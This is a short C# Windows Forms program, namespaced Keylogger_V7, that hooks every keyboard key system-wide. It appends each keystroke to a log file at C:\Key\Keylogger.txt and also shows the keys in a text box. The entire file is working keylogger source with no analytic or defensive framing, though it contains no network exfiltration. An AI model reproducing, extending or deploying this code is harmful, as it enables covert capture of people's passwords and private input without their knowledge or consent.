using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Utilities;
using System.IO;

namespace Keylogger_V7
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        globalKeyboardHook gkh = new globalKeyboardHook();
        private void HookAll()
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys)key);
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            HookAll();
            if (File.Exists(@"C:\Key\Keylogger.txt"))
            {
                File.Delete(@"C:\Key\Keylogger.txt");
            }
        }
        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            StreamWriter SW = new StreamWriter(@"C:\Key\Keylogger.txt", true);
            SW.Write(e.KeyCode);
            SW.Close();
            textBox1.Text += Convert.ToString(e.KeyCode);
        }
    }
}
